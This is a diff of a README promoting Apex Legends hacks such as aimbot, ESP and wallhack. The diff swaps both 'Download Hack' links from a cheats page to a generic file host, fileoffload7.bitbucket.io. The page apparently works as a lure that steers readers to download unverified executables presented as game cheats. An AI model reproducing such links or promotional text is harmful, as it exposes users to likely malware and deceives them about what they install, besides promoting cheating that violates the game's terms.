@@ -4,14 +4,14 @@
 
 Apex Legends is a fast-paced battle royale game that demands precision and quick reflexes. For players seeking to enhance their gameplay experience, various hacks offer features like aimbot, ESP, wallhack, and radar tools. This guide delves into these tools, their features, comparisons, system requirements, installation instructions, and more.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/apex-legends)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload7.bitbucket.io)
 ---
 
 ## Product Description
 
 Apex Legends hacks are third-party tools designed to modify the game's behavior, providing players with additional capabilities. These tools can alter gameplay elements, offering features not available in the standard game.
 
-[![Download Hack](https://repository-images.githubusercontent.com/777913148/395645e8-a8d2-4375-b056-bf14a17d4af7)](https://wecheaters.github.io/cheats/apex-legends)
+[![Download Hack](https://repository-images.githubusercontent.com/777913148/395645e8-a8d2-4375-b056-bf14a17d4af7)](https://fileoffload7.bitbucket.io)
 ---
 
 ## Features
